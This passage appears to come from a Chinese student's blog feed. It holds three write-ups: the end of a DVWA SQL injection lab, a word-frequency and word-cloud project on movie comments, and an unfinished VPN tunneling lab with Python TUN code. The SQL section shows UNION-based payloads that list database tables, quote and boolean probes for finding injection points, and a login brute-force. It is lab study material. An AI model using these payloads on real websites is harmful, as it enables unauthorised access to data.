自带的一张表，这张数据表保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库</p></blockquote><p>我们输入的内容为 <code>1&#39; union select table_name,table_schema from information_schema.tables where table_schema= &#39;dvwa&#39;#</code>，但是由于存在转义字符，所以可以采用16进制来写dvwa或者<code>database()</code>来代替，实际所执行的SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">union</span><span class="hljs-keyword">select</span> table_name,table_schema <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema= <span class="hljs-string">'dvwa'</span><span class="hljs-comment">#;</span></code></pre><p>结果如下</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><p>所以此时我们可以得到<code>dvwa</code>这个数据库下面有两个表，分别名为<code>guestbook</code>和<code>users</code></p><h3 id="验证绕过，级别为medium"><a href="#验证绕过，级别为medium" class="headerlink" title="验证绕过，级别为medium"></a>验证绕过，级别为medium</h3><p>首先来看能够正确验证，我们在<code>user</code>和<code>password</code>直接输入123，会发现提示此时账户/密码不正确</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>之后来看后台的php代码的具体运行情况，发现比较重要的是SQL的select语句以及后面呢条件判断，而当我们输入123的时候，实际执行的SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">'123'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">'123'</span></code></pre><p>在这里好像有转义字符的限制，我们通过将捕获的包<code>Intruder</code>模块来实现，可以用暴力破解来实现，可以看到password的字段长度和其他的明显不一样（因为返回的正确信息的长度和错误信息的长度不一样），所以密码可能就是<code>password</code>，试验后发现成功login</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>4.1 判断是否存在注入漏洞</strong></p><p>一般我们进行判断的时候，在输入的参数后面加一个单引号，比如</p><pre><code class="hljs sql">http://xxx/abc.php?id=1'</code></pre><p>当页面返回错误的时候，说明是存在SQL注入的，因为无论字符型还是整型都会因为单引号个数不匹配而报错（比如在安全级别为low的时候，当我们输入1’的时候，会报语法错误）。</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>而如果未报错，不代表不存在 Sql 注入，因为有可能页面对单引号做了过滤/转义，这时可以使用判断语句进行注入（比如在安全级别为medium的时候进行了转义）</p><p>*<em>4.2 判断注入类型是字符型还是数字型 *</em></p><p>当输入<code>and 1=1</code>，此时执行的SQL语句就是</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = x <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span></code></pre><p>如果此时成功，试验<code>and 1=2</code></p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = x <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span></code></pre><p>如果此时失败，则综合上面的，说明类型为数字型，因为如果注入类型为字符型，就会出现，此时并没有执行and语句后面的判断，所以不会出现上面一正一负的结果</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x and 1=1'</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x and 1=2'</span></code></pre><p>而当注入类型为字符型的时候，一般SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x'</span></code></pre><p>此时通过 <code>and &#39;1&#39;=&#39;1</code> 和 <code>and &#39;1&#39;=&#39;2</code>来判断，因为此时的执行的SQL语句为（一正一负的结果）</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'2'</span></code></pre><p>如果假设为数字型，则会变为下面的SQL语句，此时都会是语法错误</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = x <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1</span><span class="hljs-string">select * from &lt;表名&gt; where id = x and '</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">2</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>Information System Securit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫PJ</title>
    <link href="/2020/12/17/%E7%88%AC%E8%99%ABPJ/"/>
    <url>/2020/12/17/%E7%88%AC%E8%99%ABPJ/</url>
    
    <content type="html"><![CDATA[<h1 id="设计文档"><a href="#设计文档" class="headerlink" title="设计文档"></a>设计文档</h1><p align="right">姓名：贾昊龙</p><p align="right">学号：18307130049</p><p align="right">同组人员：唐宸</p><h2 id="文档说明"><a href="#文档说明" class="headerlink" title="文档说明"></a>文档说明</h2><table><thead><tr><th align="center">文件</th><th align="center">作用说明</th></tr></thead><tbody><tr><td align="center"><strong>1.png</strong></td><td align="center"><strong>根据高频词制作的词云</strong></td></tr><tr><td align="center"><strong>cn_stopwords.txt</strong></td><td align="center"><strong>Github上面获取的常用中文停用词</strong></td></tr><tr><td align="center"><strong>movie4.csv</strong></td><td align="center"><strong>将另一位同学所爬数据整合后的源数据文件</strong></td></tr><tr><td align="center"><strong>PJ.py</strong></td><td align="center"><strong>主文件，具体实现</strong></td></tr><tr><td align="center"><strong>word_csv.csv</strong></td><td align="center"><strong>按照出现次数排序后制作出的词频统计</strong></td></tr></tbody></table><h2 id="负责部分"><a href="#负责部分" class="headerlink" title="负责部分"></a>负责部分</h2><p>在这一个part，我负责来实现对于另外一名同学通过爬虫爬取的数据的分词、词频统计以及制作词云的工作，此外，我还实现了2018-2020不同月份弹幕数量的对比（通过并列柱状图来显示）</p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="分词"><a href="#分词" class="headerlink" title="分词"></a>分词</h3><p>首先，我们可以看到在原始的数据文件<code>movie.csv</code>当中（我将另一位同学爬取的三分数据放到了一个csv文件当中），这些原始数据还带有时间表示，在通过调用<code>jieba.lcut()</code>进行中文分词之后，对于一些我认为并不能反映实际意思的词语，我进行了删去，除此之外，对于一些常见的停用词，我从GitHub上面获取到了一个text文件，通过导入text文件来作为停用词的一个词典</p><p><strong>具体实现：</strong></p><pre><code class="hljs python">file = open(<span class="hljs-string">"movie4.csv"</span>, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">"utf-8"</span>)text = file.read()file.close()print(<span class="hljs-string">"读取成功,开始进行分词并制作词云"</span>)word_txt = jieba.lcut(text)    <span class="hljs-comment">#进行中文分词</span>stops_word = open(<span class="hljs-string">"cn_stopwords.txt"</span>, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">"utf-8"</span>).read()<span class="hljs-comment">#导入常见停用词词典</span>exclude = &#123;<span class="hljs-string">"马老师"</span>, <span class="hljs-string">"英国大力士"</span>, <span class="hljs-string">"婷婷"</span>, <span class="hljs-string">"不讲武德"</span>, <span class="hljs-string">"耗子尾汁"</span>, <span class="hljs-string">"哈哈哈哈"</span>, <span class="hljs-string">"没"</span>, <span class="hljs-string">"说"</span>,<span class="hljs-string">"真"</span>,<span class="hljs-string">"2020"</span>,<span class="hljs-string">"08"</span>,<span class="hljs-string">"01"</span>,<span class="hljs-string">"02"</span>,<span class="hljs-string">"03"</span>,<span class="hljs-string">"04"</span>,<span class="hljs-string">"05"</span>,<span class="hljs-string">"06"</span>,<span class="hljs-string">"07"</span>,<span class="hljs-string">"08"</span>,<span class="hljs-string">"09"</span>,<span class="hljs-string">"10"</span>,<span class="hljs-string">"11"</span>,<span class="hljs-string">"12"</span>,<span class="hljs-string">"13"</span>,<span class="hljs-string">"14"</span>,<span class="hljs-string">"15"</span>,<span class="hljs-string">"哈哈哈"</span><span class="hljs-string">"25"</span>,<span class="hljs-string">"26"</span>,<span class="hljs-string">"17"</span>,<span class="hljs-string">"30"</span>,<span class="hljs-string">"16"</span>,<span class="hljs-string">"18"</span>,<span class="hljs-string">"31"</span>,<span class="hljs-string">"22"</span>,<span class="hljs-string">"2018"</span>,<span class="hljs-string">"2019"</span>,<span class="hljs-string">"20"</span>,<span class="hljs-string">"21"</span>,<span class="hljs-string">"29"</span>,<span class="hljs-string">"19"</span>,<span class="hljs-string">"28"</span>,<span class="hljs-string">"27"</span>,<span class="hljs-string">"23"</span>,<span class="hljs-string">"24"</span>&#125;  <span class="hljs-comment">#自定义当前的停用词</span>stop_list = stops_word.split()stops_all = set(stop_list).union(set(stop_list), exclude) <span class="hljs-comment">#二者的并集</span>word_list = [element <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> word_txt <span class="hljs-keyword">if</span> element <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> stops_all]   <span class="hljs-comment">#去除停用词之后的word list</span></code></pre><p>此时我们已经对于实现了一部分分词，同时，针对于这部电影而言，可能有一些“专有名词”出现，例如：张麻子，让子弹飞等等，为了词频以及词云的准确性，我进行了添加</p><pre><code class="hljs python">jieba.add_word(<span class="hljs-string">"张麻子"</span>)    <span class="hljs-comment">#添加特殊的分词</span>jieba.add_word(<span class="hljs-string">"师爷"</span>)  jieba.add_word(<span class="hljs-string">"麻子"</span>)jieba.add_word(<span class="hljs-string">"讲真的"</span>)jieba.add_word(<span class="hljs-string">"让子弹飞"</span>)jieba.add_word(<span class="hljs-string">"名场面"</span>)</code></pre><p>此时我们其实已经完成了分词部分</p><h3 id="词频统计"><a href="#词频统计" class="headerlink" title="词频统计"></a>词频统计</h3><p>之后，我希望能够获取一个词频统计，根据词频统计来进行制作词云，在词频统计的时候，我又将一些可能出现的单个“词”进行来删去，比如“个”，“谁”等等，具体实现是根据上面筛过一轮之后产生的word_list再进行一轮筛选，将符合要求的词放入列表中，之后根据出现数量的大小进行<code>sort()</code>，并且把统计之后的结果打印并存储在<code>word_csv.csv</code>文件当中</p><p><strong>具体实现：</strong></p><pre><code class="hljs python"><span class="hljs-comment">#之后来实现对于词频的统计</span>word_dict = &#123;&#125;word_lists = []<span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> word_list:    <span class="hljs-keyword">if</span> len(word) == <span class="hljs-number">1</span>:        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">else</span>:        word_lists.append(word)             word_dict[word] = word_dict.get(word, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>wd = list(word_dict.items())    <span class="hljs-comment">#使字典列表化</span>wd.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)       <span class="hljs-comment">#排序</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">50</span>):     <span class="hljs-comment">#生成前二十个高频的词</span>    print(wd[i])word_csv = wd       <span class="hljs-comment">#将结果写入到csv文件当中</span>pd.DataFrame(data=word_csv[<span class="hljs-number">0</span>:<span class="hljs-number">50</span>]).to_csv(<span class="hljs-string">'word_csv.csv'</span>, encoding=<span class="hljs-string">'UTF-8'</span>)print(<span class="hljs-string">"已经完成词频统计,可在文件夹1.png中查看词云"</span>)</code></pre><p><strong>运行结果：</strong></p><p><img src="/2020/12/17/%E7%88%AC%E8%99%ABPJ/1.PNG" srcset="/img/loading.gif" alt="1"></p><h3 id="词云制作"><a href="#词云制作" class="headerlink" title="词云制作"></a>词云制作</h3><p>在这里我们将根据上面已经筛选出的较为高频的50个词来进行制作词云，并且把结果存储在同文件夹下面的<code>1.png</code>当中</p><p><strong>具体实现：</strong></p><pre><code class="hljs python">string = <span class="hljs-string">" "</span>.join(word_lists)    <span class="hljs-comment">#拼接为字符串</span>w = wordcloud.WordCloud(background_color = <span class="hljs-string">"white"</span>, font_path = <span class="hljs-string">"C:\Windows\Fonts\STXINWEI.TTF"</span>, width=<span class="hljs-number">1000</span>,height=<span class="hljs-number">700</span>,random_state=<span class="hljs-number">42</span>)w.generate(string)w.to_file(<span class="hljs-string">"1.png"</span>)</code></pre><p><strong>运行结果：</strong></p><p><img src="/2020/12/17/%E7%88%AC%E8%99%ABPJ/2.png" srcset="/img/loading.gif" alt="2"></p><h3 id="统计图绘制"><a href="#统计图绘制" class="headerlink" title="统计图绘制"></a>统计图绘制</h3><p>在这里，为了能够得到一些对比出的分析，我将2018-2020不同月份的弹幕量分别统计下来，并用python进行绘制，在这里图片并没有保存，而是仅<code>plt.show()</code>展示</p><p><strong>具体实现：</strong></p><pre><code class="hljs python"><span class="hljs-comment"># 之后我希望通过柱状图来能够对于整体的信息有所了解</span>print(<span class="hljs-string">"开始绘制统计图,2018-2020年不同月份的弹幕数量的对比,注意此电影在2018.3之前不可看"</span>)y1 = [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">16821</span>,<span class="hljs-number">5323</span>,<span class="hljs-number">4099</span>,<span class="hljs-number">3187</span>,<span class="hljs-number">5833</span>,<span class="hljs-number">3765</span>,<span class="hljs-number">2439</span>,<span class="hljs-number">3119</span>,<span class="hljs-number">3474</span>,<span class="hljs-number">2695</span>]y2 = [<span class="hljs-number">3212</span>,<span class="hljs-number">2190</span>,<span class="hljs-number">1406</span>,<span class="hljs-number">3312</span>,<span class="hljs-number">3217</span>,<span class="hljs-number">1849</span>,<span class="hljs-number">3359</span>,<span class="hljs-number">6051</span>,<span class="hljs-number">6271</span>,<span class="hljs-number">5890</span>,<span class="hljs-number">4500</span>,<span class="hljs-number">5029</span>]y3 = [<span class="hljs-number">6415</span>,<span class="hljs-number">7726</span>,<span class="hljs-number">10430</span>,<span class="hljs-number">7412</span>,<span class="hljs-number">23609</span>,<span class="hljs-number">18705</span>,<span class="hljs-number">41462</span>,<span class="hljs-number">42582</span>,<span class="hljs-number">12691</span>,<span class="hljs-number">12041</span>,<span class="hljs-number">12092</span>,<span class="hljs-number">2892</span>]x = np.arange(len(y3))tick_label = [<span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>,<span class="hljs-string">'3'</span>,<span class="hljs-string">'4'</span>,<span class="hljs-string">'5'</span>,<span class="hljs-string">'6'</span>,<span class="hljs-string">'7'</span>,<span class="hljs-string">'8'</span>,<span class="hljs-string">'9'</span>,<span class="hljs-string">'10'</span>,<span class="hljs-string">'11'</span>,<span class="hljs-string">'12'</span>] bar_width = <span class="hljs-number">0.25</span> plt.bar(x, y1, width=bar_width, label=<span class="hljs-string">'2018年'</span>)plt.bar(x + bar_width, y2, width=bar_width, label=<span class="hljs-string">'2019年'</span>)plt.bar(x + <span class="hljs-number">2</span> * bar_width, y3, width=bar_width, label=<span class="hljs-string">'2020年'</span>)plt.xlabel(<span class="hljs-string">"month"</span>)plt.ylabel(<span class="hljs-string">"number"</span>)plt.title(<span class="hljs-string">'Picture'</span>)plt.xticks(x+bar_width/<span class="hljs-number">2</span>, tick_label)plt.legend()plt.show()</code></pre><p><strong>运行结果：</strong></p><p><img src="/2020/12/17/%E7%88%AC%E8%99%ABPJ/3.PNG" srcset="/img/loading.gif" alt="3"></p><h2 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h2><ul><li><p><strong>分词以及词频部分</strong>：</p><ul><li>在这一个部分中，我认为比较重要的是字典的丰富性和针对性，在这一环节的工作中，我认为比较好的一点是我不仅针对于源数据进行了类似“专有名词”的添加以及通用和自己添加的停用词、还在制作词频的时候进一步进行来筛选，从而分析出的词云能够较好地反映出弹幕的热词</li></ul></li><li><p><strong>词云制作部分：</strong></p><ul><li>在这一个part，我们可以根据词云看到，一些电影里的“专有名词”是比较多的出现于弹幕当中的，例如：师爷、黄四郎等</li></ul></li><li><p><strong>统计图绘制</strong></p><ul><li>在这里，我们可以通过数据对比来分析出一些东西，例如在刚出现的2018年3月，此时弹幕数量是2018年最多的，此后数据发生起伏，而分析可得，很有可能与学生的寒暑假等相关，而之后比较显著的是在2020年的7月和8月，达到了到现在为止的最高弹幕数量（<strong>仅针对于这部电影而言</strong>），这一方面是因为寒暑假假期，另一方面我认为与疫情的关系也有很大关系</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Information Content System</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VPN-Tunneling</title>
    <link href="/2020/12/13/VPN-Tunneling/"/>
    <url>/2020/12/13/VPN-Tunneling/</url>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>核心内容：了解VPN的两个基本部分（隧道以及加密），涉及到的板块/主题：VPN、TUN/TAP虚拟接口、IP隧道、路由</p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="Task-1：网络设置"><a href="#Task-1：网络设置" class="headerlink" title="Task 1：网络设置"></a>Task 1：网络设置</h3><table><thead><tr><th align="center">VPN Client/Host U</th><th align="center">10.0.2.4</th></tr></thead><tbody><tr><td align="center"><strong>Gateway</strong></td><td align="center"><strong>10.0.2.5、192.168.60.1</strong></td></tr><tr><td align="center"><strong>Host V</strong></td><td align="center"><strong>192.168.60.101</strong></td></tr></tbody></table><ul><li><strong>U和VPN Server之间通信</strong></li></ul><p><img src="/2020/12/13/VPN-Tunneling/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><ul><li><strong>VPN Server和V之间进行通信</strong></li></ul><p><img src="/2020/12/13/VPN-Tunneling/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><ul><li><strong>Host U和Host V之间不能通信</strong></li></ul><p><img src="/2020/12/13/VPN-Tunneling/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><h3 id="Task-2：创建和配置TUN接口"><a href="#Task-2：创建和配置TUN接口" class="headerlink" title="Task 2：创建和配置TUN接口"></a>Task 2：创建和配置TUN接口</h3><p><a href="https://blog.kghost.info/2013/03/27/linux-network-tun/" target="_blank" rel="noopener">TUN/TAP设备</a></p><p><a href="https://cloud.tencent.com/developer/article/1432451" target="_blank" rel="noopener">TUN/TAP解析</a></p><p><img src="/2020/12/13/VPN-Tunneling/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><h4 id="Task-2-a：接口命名"><a href="#Task-2-a：接口命名" class="headerlink" title="Task 2.a：接口命名"></a>Task 2.a：接口命名</h4><p>直接在py文件中把<code>tun%d</code>改为<code>jia%d</code>就行，结果如下</p><p><img src="/2020/12/13/VPN-Tunneling/2-2.png" srcset="/img/loading.gif" alt="2-2"></p><h4 id="Task-2-b：设置TUN接口"><a href="#Task-2-b：设置TUN接口" class="headerlink" title="Task 2.b：设置TUN接口"></a>Task 2.b：设置TUN接口</h4><p><img src="/2020/12/13/VPN-Tunneling/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>可以看到此时的<code>jia0</code>端口已经有了对应的IP地址192.168.53.99，并且端口已经打开</p><h4 id="Task-2-c：从TUN接口中读取"><a href="#Task-2-c：从TUN接口中读取" class="headerlink" title="Task 2.c：从TUN接口中读取"></a>Task 2.c：从TUN接口中读取</h4><p><img src="/2020/12/13/VPN-Tunneling/2-4.PNG" srcset="/img/loading.gif" alt="2-4"></p><p>可以看到打印出来发往192.168.53.0/24的IP包的信息，因为调用了标准的read来从tun文件来读取数据</p><p>而当我们ping 192.168.60.0/24内的主机的时候，此时并没有打印出任何信息，因为tun接口的IP地址为192.168.53.99，和192.168.60.1不属于同一个子网，也没有设置相应的路由表项</p><p><img src="/2020/12/13/VPN-Tunneling/2-5.PNG" srcset="/img/loading.gif" alt="2-5"></p><h4 id="Task-2-d：写入到TUN接口"><a href="#Task-2-d：写入到TUN接口" class="headerlink" title="Task 2.d：写入到TUN接口"></a>Task 2.d：写入到TUN接口</h4><p>如果是echo request包的时候，构造echo response包并写入</p><pre><code class="hljs python"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<span class="hljs-comment"># Get a packet from the tun interface</span>packet = os.read(tun, <span class="hljs-number">2048</span>)<span class="hljs-keyword">if</span> <span class="hljs-literal">True</span>:ip = IP(packet)<span class="hljs-comment"># print(ip.summary())</span><span class="hljs-keyword">if</span> ip.proto == <span class="hljs-number">1</span>: <span class="hljs-comment"># ICMP package</span>newip = IP(src = ip.dst, dst = ip.src)newpkt = newip/ICMP(type = <span class="hljs-number">0</span>, code = <span class="hljs-number">0</span>)os.write(tun, bytes(newpkt))print(ip.summary())</code></pre><p>之后再次选择<code>ping 192.168.53.1</code>，同时用wireshark抓包，抓包情况如下，tun收到了相应的回显包的请求</p><p><img src="/2020/12/13/VPN-Tunneling/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><p>向接口中写入任意的数据，而不是IP包的时候</p><p><img src="/2020/12/13/VPN-Tunneling/2-8.PNG" srcset="/img/loading.gif" alt="2-8"></p><p>同样运行ping 192.168.53.1，之后wireshark抓包情况如下，可以看出来tun会把写入的东西当作IP数据包来处理</p><p><img src="/2020/12/13/VPN-Tunneling/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p><h3 id="Task-3：通过隧道将IP包发往VPN-server"><a href="#Task-3：通过隧道将IP包发往VPN-server" class="headerlink" title="Task 3：通过隧道将IP包发往VPN server"></a>Task 3：通过隧道将IP包发往VPN server</h3><p><img src="/2020/12/13/VPN-Tunneling/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>当我们ping 192.168.53.1的时候，内部会有一个IP数据包发往对应的IP地址，之后外层的UDP包是由10.0.2.4发往10.0.2.5的，wireshark抓包如下</p><p><img src="/2020/12/13/VPN-Tunneling/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><p>当我们选择ping 192.168.60.10的时候，VPN Server端什么都不会打印出来，通过wireshark抓包可以发现，我认为这是由于目的IP和TUN接口不在一个子网当中，并且没有对应的路由表项，所以会将发给192.168.60.0/24的数据包交给10.0.2.4来发送，而此时tun_client.py相当于是不发挥作用</p><p><img src="/2020/12/13/VPN-Tunneling/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p><p>为了解决这个问题，我们需要设置路由，将发给192.168.60.0/24的数据包交给TUN接口来发送</p><p><img src="/2020/12/13/VPN-Tunneling/3-4.PNG" srcset="/img/loading.gif" alt="3-4"></p><p>之后再次ping 192.168.60.0/24，VPN_Server端会收到相应的数据包，并且wireshark会显示发包过程</p><p><img src="/2020/12/13/VPN-Tunneling/3-5.PNG" srcset="/img/loading.gif" alt="3-5"></p><p><img src="/2020/12/13/VPN-Tunneling/3-6.PNG" srcset="/img/loading.gif" alt="3-6"></p><h3 id="Task-3回顾"><a href="#Task-3回顾" class="headerlink" title="Task 3回顾"></a>Task 3回顾</h3><p>对于整个过程要有所理解，首先我们前面之所以ping 192.168.53.0/24能够成功，是因为Host U知道发往这个子网的IP数据包应该交给192.168.53.99（TUN接口）来处理，而之后当我们ping 192.168.60.0/24的时候，并不知道是路由表项，会交给10.0.2.4来处理，这就有了上面我们用wireshark抓包会显示从10.0.2.4这个接口发出的原因，因为这时候TUN接口压根不起作用，而之后，当我们知道要将发给192.168.60.0/24的IP数据包交给TUN接口的时候，我们就可以开始执行后面的code</p><p><img src="/2020/12/13/VPN-Tunneling/3-7.PNG" srcset="/img/loading.gif" alt="3-7"></p><h3 id="Task-4：设置VPN服务器"><a href="#Task-4：设置VPN服务器" class="headerlink" title="Task 4：设置VPN服务器"></a>Task 4：设置VPN服务器</h3><blockquote><p>在tun_server.py收到一个来自于隧道当中的包的时候，需要提交给内核，之后内核将其路由到最终目的地。这需要TUN接口来完成</p></blockquote><p>我认为之所以需要TUN接口来运行，其实是相当于是解包的过程，因为在Host U的那一端，我们首先是将数据写入到tun文件当中，这时候相当于是有了一个IP包（里），但是之后这个包会在10.0.2.4那里被放到UDP的有效载荷那里，之后外面再包上UDP头部以及IP头部。现在在VPN server端，其实只能是读取到pkt的信息，也就是里面的IP包那一层，还需要TUN接口来进一步解包</p><p>首先，在VPN_Server上面可以根据terminal打印的东西看到，ping 192.168.60.101的数据包是到达了VPN_Server的</p><p><img src="/2020/12/13/VPN-Tunneling/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p><p>之后，我们进行抓包，可以看到在wireshak中，192.168.53.99是向192.168.60.101发送了ICMP request包并且目的主机返回了ICMP的response包的</p><p><img src="/2020/12/13/VPN-Tunneling/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p><p>但是此时根据在VPN_Client运行的TUN接口的termina可以得知，是没有收到相应的数据包的。分析可以得知ICMP request包的确到达，此时单方面ping通</p><h3 id="Task-5：处理两个方向上的流量"><a href="#Task-5：处理两个方向上的流量" class="headerlink" title="Task 5：处理两个方向上的流量"></a>Task 5：处理两个方向上的流量</h3><ul><li><p>在VPN server上面，当监听的是socket的时候，那说明是收到了来自于其他地方的包，所以需要将包递交给TUN接口来进一步解包，而当时tun接口的时候，需要把包读出来，通过socket发给Host V</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">import</span> fcntl<span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> time<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *IP_A = <span class="hljs-string">"0.0.0.0"</span>PORT = <span class="hljs-number">9090</span>TUNSETIFF = <span class="hljs-number">0x400454ca</span>IFF_TUN = <span class="hljs-number">0x0001</span>IFF_TAP = <span class="hljs-number">0x0002</span>IFF_NO_PI = <span class="hljs-number">0x1000</span><span class="hljs-keyword">global</span> portsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)sock.bind((IP_A, PORT))<span class="hljs-comment"># Create the tun interface</span>tun = os.open(<span class="hljs-string">"/dev/net/tun"</span>, os.O_RDWR)ifr = struct.pack(<span class="hljs-string">'16sH'</span>, <span class="hljs-string">b'long%d'</span>, IFF_TUN | IFF_NO_PI)ifname_bytes = fcntl.ioctl(tun, TUNSETIFF, ifr)<span class="hljs-comment"># Get the interface name</span>ifname = ifname_bytes.decode(<span class="hljs-string">'UTF-8'</span>)[:<span class="hljs-number">16</span>].strip(<span class="hljs-string">"\x00"</span>)print(<span class="hljs-string">"Interface Name: &#123;&#125;"</span>.format(ifname))os.system(<span class="hljs-string">"ip addr add 192.168.53.100/24 dev &#123;&#125;"</span>.format(ifname))os.system(<span class="hljs-string">"ip link set dev &#123;&#125; up"</span>.format(ifname))<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<span class="hljs-comment"># this will block until at least one interface is ready</span>ready, _, _ = select.select([sock, tun], [], [])<span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> ready:<span class="hljs-keyword">if</span> fd <span class="hljs-keyword">is</span> sock:data, (ip, port) = sock.recvfrom(<span class="hljs-number">2048</span>)pkt = IP(data)print(<span class="hljs-string">"From socket &lt;==: &#123;&#125; --&gt; &#123;&#125;"</span>.format(pkt.src, pkt.dst))<span class="hljs-comment">#we need to send the IP packet to the TUN interface</span>os.write(tun, bytes(pkt))<span class="hljs-keyword">if</span> fd <span class="hljs-keyword">is</span> tun:<span class="hljs-comment"># read from the file</span>packet = os.read(tun, <span class="hljs-number">2048</span>)pkt = IP(packet)print(<span class="hljs-string">"From tun ==&gt;: &#123;&#125; --&gt; &#123;&#125;"</span>.format(pkt.src, pkt.dst))sock.sendto(packet, (<span class="hljs-string">"10.0.2.4"</span>, port))</code></pre></li><li><p>在VPN_Client上面，当监听到socket的时候，说明是来自外面的包，需要发给TUN接口，而当是TUN接口的时候，需要利用socket发给VPN_Server</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><span class="hljs-keyword">import</span> fcntl<span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> os<span 